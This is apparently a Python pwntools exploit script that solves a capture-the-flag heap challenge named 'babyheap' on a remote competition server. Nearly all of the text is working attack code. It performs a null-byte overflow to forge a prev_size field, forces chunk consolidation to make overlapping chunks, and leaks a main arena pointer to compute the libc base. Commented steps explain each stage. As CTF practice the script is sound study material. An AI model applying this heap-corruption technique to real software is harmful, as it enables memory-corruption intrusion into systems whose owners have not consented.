#!/usr/bin/env python

from pwn import *

def alloc(size, content):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('please input chunk size: ')
    p.sendline(str(size))
    p.recvuntil('input chunk content: ')
    p.send(content)
    
    if len(content) < size:
        p.sendline()

def show(index):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil('please input chunk index: ')
    p.sendline(str(index))

def delete(index):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('please input chunk index: ')
    p.sendline(str(index))

p = remote('babyheap.2018.teamrois.cn', 3154)
#p = process('./babyheap')

alloc(240, 'b' * 240) # 0 smallbin
alloc(112, 'c' * 112) # 1 fastbin
alloc(240, 'd' * 240) # 2 smallbin
alloc(16, 'e' * 16)   # 3 fastbin (in order to prevent consolidation with top chunk)

delete(0)
delete(1)

# write one null byte to convert smallbin #2's size from 0x101 to 0x100
# make the smallbin #2's previous chunk NOT in use
# make smallbin #2's prev_size == 384
alloc(120, 'f' * 112 + p64(384)) # 0 fastbin

# smallbin #2 consolidates with smallbin #0 because its prev_size == 384
# basically, fastbin #1 is forgotten
delete(2)

# fastbin #1 overlaps with a free chunk
# free chunk's fd and bk point to main arena
alloc(240, 'g' * 240) # 1 smallbin

# leak the main arena address, which leads to libc base address
show(0)

p.recvuntil('content: ')
libc_base = u64(p.recv(6) + '\x00\x00') - 0x3c4b78

print 'libc base: {}'.format(hex(libc_base))

p.interactive()

